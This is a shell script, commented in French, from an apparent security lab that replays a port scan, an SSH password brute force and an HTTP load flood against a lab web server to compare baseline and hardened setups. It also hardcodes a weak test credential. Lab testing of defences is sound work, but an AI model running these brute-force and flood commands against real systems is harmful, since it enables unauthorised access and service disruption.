#!/bin/sh
# =====================================================================
#  /opt/attack.sh - Suite d'attaques du jumeau (semaine 5)
#
#  Rejoue EXACTEMENT les memes attaques sur les deux scenarios
#  (baseline et durci), toujours contre le serveur web publie
#  10.10.20.10 (cahier des charges 4.6). Jamais une IP 172.20.20.x :
#  le reseau de gestion contourne le pare-feu et n'est pas une cible.
#
#  Trois attaques, dans l'ordre :
#    1. Scan de ports    : nmap -sS -T4 -p 1-10000
#    2. Brute force SSH  : hydra -t 4 (courte wordlist contenant le mot
#                          de passe baseline password123)
#    3. Surcharge HTTP   : ab -n 5000 -c 50
#
#  Les sorties brutes sont ecrites dans /results (monte sur l'hote :
#  results/ du depot) avec un suffixe de scenario, pour etre analysees
#  ensuite par analysis/score.py. Un horodatage de debut d'attaque est
#  enregistre : il sert a mesurer le temps de detection (premiere alerte
#  Suricata) et le temps de bannissement (premiere ligne de ban.log).
#
#  Ce script N'EST PAS lance automatiquement : il est appele par
#  "make attack SCENARIO=baseline|hardened" (depuis l'hote, via
#  docker exec) une fois le jumeau deploye dans le scenario voulu.
# =====================================================================
set -u

WEB=10.10.20.10
SSH_USER=testuser
RESULTS=/results

# Scenario passe en argument (baseline par defaut) : sert uniquement a
# nommer les fichiers de sortie, pas a changer les attaques (elles sont
# strictement identiques entre les deux scenarios - c'est tout l'interet
# de la comparaison avant/apres).
SCENARIO="${1:-baseline}"
WORDLIST="${2:-/opt/wordlist.txt}"
SUFFIX="$SCENARIO"

mkdir -p "$RESULTS"

log() { echo "[attack][$SCENARIO] $*"; }

# --- Horodatage de debut (epoch) : reference pour les temps de detection
#     et de bannissement calcules par score.py cote hote. ---
START_EPOCH=$(date +%s)
date -u +"%Y-%m-%dT%H:%M:%SZ" > "$RESULTS/attack_start_$SUFFIX.txt"
echo "$START_EPOCH" >> "$RESULTS/attack_start_$SUFFIX.txt"
log "debut des attaques contre $WEB a $(date -u +%H:%M:%S) UTC"

# =====================================================================
#  1. Scan de ports - nmap -sS -T4 -p 1-10000
# =====================================================================
log "1/3 scan de ports (nmap -sS -T4 -p 1-10000)"
# --max-retries 1 / --host-timeout : en scenario durci l'attaquant est
# banni pendant le scan ; sans bornes, nmap retransmettrait sans fin les
# sondes desormais ignorees (deja observe en phase 2/3). Le ralentissement
# est lui-meme un signe que la defense fonctionne.
nmap -sS -T4 --max-retries 1 --host-timeout 120s -p 1-10000 "$WEB" \
    > "$RESULTS/nmap_$SUFFIX.txt" 2>&1
log "    -> $RESULTS/nmap_$SUFFIX.txt"

# =====================================================================
#  2. Brute force SSH - hydra -t 4
# =====================================================================
# La wordlist contient volontairement le mot de passe faible du scenario
# baseline (password123). En baseline, hydra DOIT trouver le couple
# testuser/password123 ; en durci (PasswordAuthentication no), aucune
# tentative par mot de passe ne peut aboutir.
log "2/3 brute force SSH (hydra -t 4, user=$SSH_USER)"
hydra -l "$SSH_USER" -P "$WORDLIST" -t 4 -f -o "$RESULTS/hydra_$SUFFIX.txt" \
    -I "ssh://$WEB" > "$RESULTS/hydra_stdout_$SUFFIX.txt" 2>&1
# hydra ecrit la ligne "[22][ssh] host: ... login: ... password: ..."
# dans le fichier -o uniquement en cas de succes. On garde aussi stdout
# pour tracer les cas d'echec (connexion refusee, ban en cours, etc.).
log "    -> $RESULTS/hydra_$SUFFIX.txt (+ hydra_stdout_$SUFFIX.txt)"

# =====================================================================
#  3. Surcharge HTTP - ab -n 5000 -c 50
# =====================================================================
# -k : en scenario durci, le port 80 redirige en 301 vers HTTPS ; ab
# suit le port 80 publie et mesure la disponibilite telle que vue par
# l'attaquant (un ban coupe la connexion -> requetes en echec).
log "3/3 surcharge HTTP (ab -n 5000 -c 50)"
ab -n 5000 -c 50 -s 10 "http://$WEB/" \
    > "$RESULTS/ab_$SUFFIX.txt" 2>&1
log "    -> $RESULTS/ab_$SUFFIX.txt"

END_EPOCH=$(date +%s)
echo "$END_EPOCH" > "$RESULTS/attack_end_$SUFFIX.txt"
log "attaques terminees en $(( END_EPOCH - START_EPOCH ))s"
log "analyse : make score SCENARIO=$SCENARIO"
